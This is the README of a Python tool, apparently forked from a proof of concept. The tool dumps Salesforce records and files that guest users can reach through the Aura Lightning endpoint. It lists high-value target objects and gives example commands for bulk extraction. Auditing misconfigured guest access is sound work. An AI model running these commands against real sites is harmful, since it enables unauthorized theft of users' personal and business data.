# Salesforce Lightning Auditor
Forked from poc_salesforce_lightning by moniik

Additions:
+ Auto download of files accessible to guests

This tool dumps the data of Salesforce object through Aura lightning endpoint with the guest privilege.


# Requirement
- Python3 

# Usage
```
$ python3 exploit.py -h
usage: exploit.py [-h] -u URL [-o [OBJECTS [OBJECTS ...]]] [-l] [-c]
                  [-a AURA_CONTEXT] [-r RECORD_ID] [-d] [-f] [-s]

Exploit Salesforce through the aura endpoint with the guest privilege

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     set the SITE url. e.g. http://url/site_path
  -o [OBJECTS [OBJECTS ...]], --objects [OBJECTS [OBJECTS ...]]
                        set the object name. Default value is "User" object.
                        Juicy Objects: Case,Account,User,Contact,Document,Cont
                        entDocument,ContentVersion,ContentBody,CaseComment,Not
                        e,Employee,Attachment,EmailMessage,CaseExternalDocumen
                        t,Attachment,Lead,Name,EmailTemplate,EmailMessageRelat
                        ion
  -l, --listobj         pull the object list.
  -c, --check           only check aura endpoint
  -a AURA_CONTEXT, --aura_context AURA_CONTEXT
                        set your valid aura_context
  -r RECORD_ID, --record_id RECORD_ID
                        set the recode id to dump the record
  -d, --dump_objects    dump a small number of objects accessible to guest
                        users and saves them in the file and downloads all files
                        returned when checking ContentDocument.
  -f, --full            if set with -d, dump all pages of objects.
  -s, --skip            if set with -d, skip the objects already dumped.
```

# Examples 
```
# just list objects
$ python3 exploit.py -u https://domain.force.com/path/ -l

# show User and Account object
$ python3 exploit.py -u https://domain.force.com/path/ -o User Account

# save all objects(only page 1)
$ python3 exploit.py -u https://domain.force.com/path/ -d -s
```

# Reference
- Salesforce Lightning - An in-depth look at exploitation vectors for the everyday community
  - https://www.enumerated.de/index/salesforce
